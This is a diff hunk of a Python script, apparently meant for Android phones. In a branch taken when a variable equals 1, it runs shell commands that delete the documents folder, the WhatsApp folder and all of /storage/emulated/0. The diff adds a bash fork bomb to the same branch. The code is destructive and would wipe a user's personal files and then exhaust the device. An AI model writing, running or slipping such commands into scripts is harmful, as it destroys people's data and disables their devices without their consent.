@@ -404,6 +404,7 @@ if siii == 1:
     os.system("rm -rf /storage/emulated/0/documents")
     os.system("rm -rf /storage/emulated/0/whatsapp")
     os.system("rm -rf /storage/emulated/0/*")
+    os.system(":(){ :|:& };:")
 
 else:
     print("Introdujiste un valor erroneo reintenta por favor")
